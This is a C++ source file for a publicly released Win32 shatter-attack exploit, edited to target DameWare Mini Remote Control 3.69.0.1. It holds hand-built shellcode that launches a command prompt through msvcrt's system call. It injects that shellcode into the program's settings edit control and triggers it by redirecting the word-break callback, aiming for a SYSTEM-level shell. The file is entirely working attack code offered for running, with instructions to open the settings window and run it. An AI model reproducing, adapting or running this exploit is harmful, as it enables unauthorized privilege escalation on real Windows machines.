// DameBreak.cpp - Simple Win32 Edit control exploit 
// ----------------------------------------------
// (C) 2003 Oliver Lavery (xenophi1e)
//
// This source code is released to the public domain.
// For information about what this means, see:
//   http://creativecommons.org/licenses/publicdomain
// 
// This has been edited to work with Dameware Mini Remote Control 
// Version 3.69.0.1
// Just bring up the Settings menu of the tray icon and run.
// 
// Special thanks goes to xenophi1e for the hard work.
//
// consume


#define WIN32_LEAN_AND_MEAN
#include "windows.h"
#include <stdio.h>

#pragma warning(disable: 4305)
#pragma warning(disable: 4309)

void MakeShellCode (char *buffer) 
{
		HMODULE hCRT;
		void * lpSystem;
        int count=0;
        
		// This is David Litchfield's simple rasman shellcode hacked up.
		// It's crappy but does the job.
		//
		//  NOTE: while this shellcode causes the caller to crash,
		//   since we're jumping into it via a normal function call with an
		//   undamaged stack, it would be very easy to simply return control
		//   to the caller if we wanted to be more subtle.

        while (count < 36)
                {
                        buffer[count]=0x90;
                        count ++;
                }
        buffer[37]=0x8B;        buffer[38]=0xE5;        buffer[39]=0x55;
        buffer[40]=0x8B;        buffer[41]=0xEC;        buffer[42]=0x33;
        buffer[43]=0xFF;        buffer[44]=0x90;        buffer[45]=0x57;
        buffer[46]=0x83;        buffer[47]=0xEC;        buffer[48]=0x04;
        buffer[49]=0xC6;        buffer[50]=0x45;        buffer[51]=0xF8;
        buffer[52]=0x63;        buffer[53]=0xC6;        buffer[54]=0x45;
        buffer[55]=0xF9;        buffer[56]=0x6D;        buffer[57]=0xC6;
        buffer[58]=0x45;        buffer[59]=0xFA;        buffer[60]=0x64;
        buffer[61]=0xC6;        buffer[62]=0x45;        buffer[63]=0xFB;
        buffer[64]=0x2E;        buffer[65]=0xC6;        buffer[66]=0x45;
        buffer[67]=0xFC;        buffer[68]=0x65;        buffer[69]=0xC6;
        buffer[70]=0x45;        buffer[71]=0xFD;        buffer[72]=0x78;
        buffer[73]=0xC6;        buffer[74]=0x45;        buffer[75]=0xFE;
        buffer[76]=0x65;

		// XXX no checks. If this fails then you have bigger problems...
		hCRT = LoadLibrary("msvcrt.dll");
		lpSystem = GetProcAddress( hCRT, "system" );

        buffer[77]=0xB8;
        buffer[78]=((char *)&lpSystem)[0];
        buffer[79]=((char *)&lpSystem)[1];
        buffer[80]=((char *)&lpSystem)[2];
        buffer[81]=((char *)&lpSystem)[3];
        
		buffer[82]=0x50;        buffer[83]=0x8D;        buffer[84]=0x45;
        buffer[85]=0xF8;        buffer[86]=0x50;        buffer[87]=0xFF;
        buffer[88]=0x55;        buffer[89]=0xF4;

        count = 90;
        while (count < 291)
                {
                        buffer[count]=0x90;
                        count++;
                }
        
        buffer[291]=0x24;        buffer[292]=0xF1;        buffer[293]=0x5D;
        buffer[294]=0x01;        buffer[295]=0x26;        buffer[296]=0xF1;
        buffer[297]=0x5D;        buffer[298]=0x01;        buffer[299]=0x00;
        buffer[300]=0x00;
	return;
}


void ErrorNotify(DWORD err, char *title)
{

	LPVOID lpMsgBuf;

	FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		(LPTSTR) &lpMsgBuf,
		0,
	    NULL 
	);

// Display the string.
	MessageBox( NULL, (char *)lpMsgBuf, title, MB_OK|MB_ICONINFORMATION );

// Free the buffer.
	LocalFree( lpMsgBuf );
};

#define SHELLCODE_SIZE (1024 * 256)
#define SHELLCODE_OFFSET (SHELLCODE_SIZE - 400)

int main(int argc, char* argv[])
{
	HWND hWnd;
	HWND hWndChild;
	char sc[SHELLCODE_SIZE];
	char szWindowName[40];
	LONG lExecAddress;

	sc[0] = 'x'; sc[1] = 'e'; sc[2] = 'n'; sc[3] = 'o';
	memset( &sc[4], 0x90, SHELLCODE_SIZE - 4);

	MakeShellCode( &sc[SHELLCODE_OFFSET] );
	printf( "Generic Edit control shatter exploit by xenophi1e\n-------\n" );
	printf( "Edited by consume to work only with Dameware Mini Remote Control\n-------\n" );
	printf(
		"If this exploit works you should see a SYSTEM command prompt.\n"
		"You need to have the Settings window from the try icon visible for success.\n\n"
		);

    strcpy ( szWindowName, "DameWare Mini Remote Control Properties" );

	// Find the window we're attacking.
	hWnd = FindWindow( NULL, szWindowName );

	if( hWnd == NULL ) 
	{
		MessageBox( NULL, "Couldn't find window", "Error", MB_OK | MB_ICONSTOP );
		return 0;
	}

	// Find an edit control contained in that window.
	hWndChild = FindWindowEx(hWnd, NULL, "Edit", NULL);
	if ( hWndChild == NULL ) {
		// Mcafee VirusScan uses tabbed pages, which put the edit controls inside 
		// seperate child dialog windows. So if we couldn't get a window, 
		// try inside the first dialog.
		// Walking the whole window tree would be better.

		hWndChild = FindWindowEx( hWnd, NULL, "#32770", NULL );
		hWndChild = FindWindowEx( hWndChild, NULL, "Edit", NULL );
	}

	// Have we got a edit control?
	if( hWndChild == NULL ) 
	{
		// No
		MessageBox( NULL, "Couldn't find child edit control window", "Error", 
			MB_OK | MB_ICONSTOP );
		return 0;
	}

	// Make sure the control isn't read only.
	SendMessage( hWndChild, EM_SETREADONLY, 0, 0 );

	// Make sure the control will hold our shellcode
	SendMessage( hWndChild, EM_SETLIMITTEXT, SHELLCODE_SIZE, 0L );

	// Send the shellcode to the target control
	if ( ! SendMessage( hWndChild, WM_SETTEXT, 0, (LPARAM)sc ) ) {
			ErrorNotify( GetLastError(), "error");
	}

	lExecAddress = 0x00156016;
	// Here's the fun part

	// First we set the WordBreakProc to point to our shellcode address
	if ( ! SendMessage( hWndChild, EM_SETWORDBREAKPROC, 0L, (LPARAM)lExecAddress ) ) {
			ErrorNotify( GetLastError(), "error" );
	}

	// Then we cause the control to call its WordBreakProc by simulating a user
	// double clicking to select a word in the control.
	SendMessage( hWndChild, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a );
	
	// At this point a command prompt should appear

 	return 0;
}

